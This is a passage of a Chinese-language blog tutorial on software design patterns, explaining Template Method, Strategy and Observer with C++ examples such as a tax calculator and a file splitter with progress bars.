c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Library</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Step1</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Step3</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Step5</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Application</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">Step2</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Step4</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">Library <span class="hljs-title">lib</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function">Application <span class="hljs-title">app</span><span class="hljs-params">()</span></span>;<br><br>lib.Step1();<br><span class="hljs-keyword">if</span> (app.Step2())&#123;<br>lib.Step3();<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>app.Step4();<br>&#125;<br>lib.Step5();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实现二，利用虚函数，将固定的算法逻辑在lib中实现，运行时调用App中实现的override的自定义步骤。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Library</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//稳定 template method</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Run</span><span class="hljs-params">()</span></span>&#123;<br>        Step1();<br>        <span class="hljs-keyword">if</span> (Step2()) <br>            Step3(); <br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>            Step4();<br>        Step5();<br>    &#125;<br><span class="hljs-keyword">virtual</span> ~Library()&#123; &#125;<br><br><span class="hljs-keyword">protected</span>:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Step1</span><span class="hljs-params">()</span> </span>&#123; 稳定 &#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Step3</span><span class="hljs-params">()</span> </span>&#123; 稳定 &#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Step5</span><span class="hljs-params">()</span> </span>&#123; 稳定 &#125;<br><span class="hljs-comment">// 一般设置为protected</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">Step2</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<span class="hljs-comment">//变化,虚函数的多态调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Step4</span><span class="hljs-params">()</span> </span>=<span class="hljs-number">0</span>; <span class="hljs-comment">//变化</span><br>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Application</span> :</span> <span class="hljs-keyword">public</span> Library &#123;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">Step2</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-comment">//... 子类重写实现</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Step4</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">//... 子类重写实现</span><br>    &#125;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>Library* pLib=<span class="hljs-keyword">new</span> Application();<br>lib-&gt;Run();<br><span class="hljs-keyword">delete</span> pLib;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实际上就是个虚函数的应用。这里的第一种为早绑定，在app程序中，实现固定不变的流程，并调用lib中的方法。第二种是晚绑定，固定流程实现在lib中，app只关心变化的部分，实现自定义的方法即可，从lib中延迟调用app实现的自定义方法。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/21/12-07-47-69d12f.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>ConcreteClass靠AbstractClass来实现算法中不变的步骤。</p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * AbstractClass</span><br><span class="hljs-comment"> * implements a template method defining the skeleton of an algorithm</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractClass</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~AbstractClass() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">templateMethod</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-comment">// ...</span><br>    primitiveOperation1();<br>    <span class="hljs-comment">// ...</span><br>    primitiveOperation2();<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">primitiveOperation1</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">primitiveOperation2</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Class</span><br><span class="hljs-comment"> * implements the primitive operations to carry out specific steps</span><br><span class="hljs-comment"> * of the algorithm, there may be many Concrete classes, each implementing</span><br><span class="hljs-comment"> * the full set of the required operation</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteClass</span> :</span> <span class="hljs-keyword">public</span> AbstractClass<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteClass() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">primitiveOperation1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Primitive operation 1"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">primitiveOperation2</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Primitive operation 2"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  AbstractClass *tm = <span class="hljs-keyword">new</span> ConcreteClass;<br>  tm-&gt;templateMethod();<br>  <br>  <span class="hljs-keyword">delete</span> tm;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="strategy">Strategy</span></h3><p>在软件构建过程中，某些对象使用的算法可能多种多样，经常改变，如果将这些算法都编码到对象中，将会使对象变得异常复杂；而且有时候支持不使用的算法也是一个性能负担。</p><p>Strategy将算法与对象本身解耦。</p><p>Strategy表述为：</p><blockquote><p>定义一系列算法，把它们一个个封装起来，并且使它们可互相替换（变化）。该模式使得算法可独立于使用它的客户程序(稳定)而变化（扩展，子类化）。</p></blockquote><h4><span id="示例3">示例3</span></h4><p>设计一个计税程序，根据不同国家税法，进行计算。</p><p>方法一，使用 if else 结构，将不同方法整合再一个对象中。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">enum</span> TaxBase &#123;<br>CN_Tax,<br>US_Tax,<br>DE_Tax,<br>FR_Tax       <span class="hljs-comment">//扩展</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SalesOrder</span>&#123;</span><br>    TaxBase tax;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">CalculateTax</span><span class="hljs-params">()</span></span>&#123;<br>        ...<br>        <span class="hljs-keyword">if</span> (tax == CN_Tax)&#123;...&#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tax == US_Tax)&#123;...&#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tax == DE_Tax)&#123;...&#125;<br>        <span class="hljs-comment">// 扩展更多情况，需要修改源代码，重新编译</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tax == FR_Tax)&#123;  <br>...<br>&#125;<br>        ...<br>     &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>方法二，使用类实现不同策略，在应用程序部分实现不变化的部分。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 策略基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TaxStrategy</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">double</span> <span class="hljs-title">Calculate</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Context&amp; context)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">virtual</span> ~TaxStrategy()&#123;&#125;<br>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CNTax</span> :</span> <span class="hljs-keyword">public</span> TaxStrategy&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">double</span> <span class="hljs-title">Calculate</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Context&amp; context)</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">USTax</span> :</span> <span class="hljs-keyword">public</span> TaxStrategy&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">double</span> <span class="hljs-title">Calculate</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Context&amp; context)</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DETax</span> :</span> <span class="hljs-keyword">public</span> TaxStrategy&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">double</span> <span class="hljs-title">Calculate</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Context&amp; context)</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-comment">//扩展新策略</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FRTax</span> :</span> <span class="hljs-keyword">public</span> TaxStrategy&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">double</span> <span class="hljs-title">Calculate</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Context&amp; context)</span></span>&#123;...&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 稳定的流程部分</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SalesOrder</span>&#123;</span><br><span class="hljs-keyword">private</span>:<br>    TaxStrategy* strategy;<br><br><span class="hljs-keyword">public</span>:<br>    SalesOrder(StrategyFactory* strategyFactory)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;strategy = strategyFactory-&gt;NewStrategy();<br>    &#125;<br>    ~SalesOrder()&#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-keyword">this</span>-&gt;strategy;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">CalculateTax</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-function">Context <span class="hljs-title">context</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-keyword">double</span> val = strategy-&gt;Calculate(context); <span class="hljs-comment">//多态调用</span><br>        <span class="hljs-comment">//...</span><br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>实现不同策略类，通过工厂模式传入策略，保持了稳定的流程部分不会改变。</p><p>这里的代码整合到了一起，实际上是在不同的文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/21/16-04-36-589561.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>一般ifelse涉及多种场景切换且可能出现扩展需求的地方，都可以考虑使用strategy模式。更多的strategy对象，可能存在一些额外的开销，可以考虑设计为singleton模式。这样不同的context也可以共享一个strategy对象，节省了开销。</p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Strategy</span><br><span class="hljs-comment"> * declares an interface common to all supported algorithms</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Strategy</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Strategy() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">algorithmInterface</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Strategies</span><br><span class="hljs-comment"> * implement the algorithm using the Strategy interface</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteStrategyA</span> :</span> <span class="hljs-keyword">public</span> Strategy<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteStrategyA() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">algorithmInterface</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Concrete Strategy A"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteStrategyB</span> :</span> <span class="hljs-keyword">public</span> Strategy<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteStrategyB() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">algorithmInterface</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Concrete Strategy B"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteStrategyC</span> :</span> <span class="hljs-keyword">public</span> Strategy<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteStrategyC() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">algorithmInterface</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Concrete Strategy C"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Context</span><br><span class="hljs-comment"> * maintains a reference to a Strategy object</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Context</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  Context( Strategy* <span class="hljs-keyword">const</span> s ) : strategy( s ) &#123;&#125;<br>  <br>  ~Context()<br>  &#123;<br>    <span class="hljs-keyword">delete</span> strategy;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">contextInterface</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    strategy-&gt;algorithmInterface();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  Strategy *strategy;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function">Context <span class="hljs-title">context</span><span class="hljs-params">( <span class="hljs-keyword">new</span> ConcreteStrategyA() )</span></span>;<br>  context.contextInterface();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="observer">Observer</span></h3><p>在软件构建过程中，我们需要为某些对象建立一种“通知依赖关系”——一个对象（目标对象）的状态发生改变，所有的依赖对象（观察者对象）都将得到通知。</p><p>定义描述：</p><blockquote><p>定义对象间的一种一对多（变化）的依赖关系，以便当一个对象(Subject)的状态发生改变时，所有依赖于它的对象都得到通知并自动更新。</p></blockquote><p>比如，当用户改变表格中的信息时, 柱状图能立即反映这一变化。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/21/16-50-36-12c2ae.png" srcset="/img/loading.gif" lazyload style="zoom:60%;"></p><h4><span id="示例4">示例4</span></h4><p>在一个大文件切分为小文件储存的过程中，增加不同的进度条显示。</p><p>方法一，直接在FileSpliter类中，调用进度条管理对象。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileSplitter</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-built_in">string</span> m_filePath;<br><span class="hljs-keyword">int</span> m_fileNumber;<br>ProgressBar* m_progressBar; <span class="hljs-comment">// 直接调用具体的进度条管理对象</span><br><br><span class="hljs-keyword">public</span>:<br>FileSplitter(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; filePath, <span class="hljs-keyword">int</span> fileNumber, ProgressBar* progressBar) :<br>m_filePath(filePath), <br>m_fileNumber(fileNumber),<br>m_progressBar(progressBar)&#123;...&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">split</span><span class="hljs-params">()</span></span>&#123;<br>...<br>        <span class="hljs-comment">// 直接调用具体对象方法，更新进度条</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m_fileNumber; i++)&#123;<br><span class="hljs-comment">//...</span><br>progressValue = (i + <span class="hljs-number">1</span>) / (<span class="hljs-keyword">float</span>)progressValue;<br>m_progressBar-&gt;setValue(progressValue);<br>&#125;<br>...<br>&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainForm</span> :</span> <span class="hljs-keyword">public</span> Form<br>&#123;<br>TextBox* txtFilePath;<br>TextBox* txtFileNumber;<br>ProgressBar* progressBar;<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Button1_Click</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">string</span> filePath = txtFilePath-&gt;getText();<br><span class="hljs-keyword">int</span> number = atoi(txtFileNumber-&gt;getText().c_str());<br><br>        <span class="hljs-comment">// 具体对象传入</span><br><span class="hljs-function">FileSplitter <span class="hljs-title">splitter</span><span class="hljs-params">(filePath, number, 